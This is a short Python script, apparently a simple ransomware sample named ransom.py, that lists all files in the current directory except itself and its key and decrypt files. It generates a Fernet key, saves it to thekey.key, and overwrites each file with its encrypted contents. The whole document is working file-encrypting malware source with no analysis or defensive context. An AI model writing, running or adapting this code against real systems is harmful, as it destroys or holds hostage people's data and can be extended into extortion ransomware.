#!/usr/bin/env python3
#ignore the first ligne

import time
import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("files encrypted")

